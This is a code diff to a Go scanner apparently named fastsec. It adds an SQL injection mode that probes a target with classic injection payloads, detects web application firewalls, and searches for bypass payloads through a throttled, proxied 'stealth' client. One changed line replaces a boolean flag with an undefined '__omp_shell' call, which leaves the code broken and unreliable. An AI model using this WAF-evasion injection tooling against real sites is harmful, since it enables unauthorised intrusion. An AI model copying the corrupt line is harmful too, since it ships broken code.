@@ -7,18 +7,60 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io"
+	"net/http"
 	"os"
 	"strings"
 	"time"
 
 	"gopkg.in/yaml.v3"
 
+	"fastsec/internal/stealth"
+
 	"fastsec/internal/diff"
 	"fastsec/internal/engine"
+	"fastsec/internal/injector"
 	"fastsec/internal/priority"
 	"fastsec/internal/session"
 	"fastsec/internal/template"
 )
+
+// wafDetect: WAF 检测（简化内嵌）
+func wafDetect(url, param string, cli *stealth.Client) struct {
+	WAFDetected bool
+	WAFName     string
+} {
+	// 用 injector 的 probes 探测
+	probes := []string{"' OR '1'='1", "1 AND 1=1", "union select 1,2,3", "1;SELECT SLEEP(5)", "1/**/AND/**/1=1"}
+	blocked := 0
+	for _, p := range probes {
+		u := url
+		sep := "?"
+		if strings.Contains(u, "?") {
+			sep = "&"
+		}
+		u = u + sep + param + "=" + strings.ReplaceAll(strings.ReplaceAll(p, " ", "%20"), "'", "%27")
+		req, _ := http.NewRequest("GET", u, nil)
+		resp, err := cli.Do(req)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
+		resp.Body.Close()
+		if resp.StatusCode == 403 || resp.StatusCode == 406 || resp.StatusCode == 493 {
+			blocked++
+		} else if strings.Contains(strings.ToLower(string(body)), "blocked") ||
+			strings.Contains(strings.ToLower(string(body)), "拦截") ||
+			strings.Contains(strings.ToLower(string(body)), "intercepted") ||
+			strings.Contains(strings.ToLower(string(body)), "denied") {
+			blocked++
+		}
+	}
+	return struct {
+		WAFDetected bool
+		WAFName     string
+	}{WAFDetected: blocked >= 2, WAFName: "detected-waf"}
+}
 
 func main() {
 	url := flag.String("u", "", "target URL (required unless -l)")
@@ -26,6 +68,7 @@ func main() {
 	tplFile := flag.String("t", "", "single template file")
 	tplDir := flag.String("d", "", "template directory")
 	diffParams := flag.String("diff", "", "behavioral diff params (comma list)")
+	injectParams := flag.String("inject", "", "SQL injection scan params (comma list, e.g. id,user)")
 	seqFile := flag.String("seq", "", "stateful attack sequence YAML file")
 	topN := flag.Int("top", 5, "top-N prioritized params to show (with -diff)")
 	concurrency := flag.Int("c", 20, "concurrency")
@@ -130,6 +173,33 @@ func main() {
 			} else {
 				fmt.Println(string(out))
 			}
+		}
+		return
+	}
+
+	// SQL 注入检测模式（injector，含 WAF 检测 + 绕过）
+	if *injectParams != "" {
+		params := strings.Split(*injectParams, ",")
+		cli := stealth.NewClient(*proxy, stealth.NewThrottle(*minDelay, *maxDelay), *concurrency)
+
+		// 1) WAF 检测（先于注入检测——WAF 会拦截 payload 导致误判 clean）
+		wafDet := wafDetect(*url, params[0], cli)
+		if wafDet.WAFDetected {
+			fmt.Printf("[injector] 检测到 WAF (%s) → 先绕过再检测\n", wafDet.WAFName)
+			// 2) 绕过：找穿透 payload
+			ok, layer, payload := injector.BypassWAF(*url, params[0], "1 AND 1=1", cli)
+			if ok {
+				fmt.Printf("[injector] 绕过成功 (%s): %s\n", layer, payload)
+				// 3) 用绕过 payload 重新注入检测（布尔：AND 1=1 → 用穿透变体）
+				res := injector.ScanBypass(*url, params, payload, cli)
+				fmt.Print(injector.Format(res))
+			} else {
+				fmt.Printf("[injector] 全部绕过层被拦\n")
+			}
+		} else {
+			// 无 WAF，直接检测
+			res := injector.Scan(*url, params, "", true, cli)
+			fmt.Print(injector.Format(res))
 		}
 		return
 	}
@@ -241,7 +311,7 @@ func main() {
 	cfg.DelayMinMs = *minDelay
 	cfg.DelayMaxMs = *maxDelay
 	cfg.Proxy = *proxy
-	cfg.VerifyGate = !*noVerify
+	cfg.VerifyGate = __omp_shell("*noVerify")
 	cfg.Cookies = *cookies
 	if *headerFlag != "" {
 		for _, pair := range strings.Split(*headerFlag, ";") {
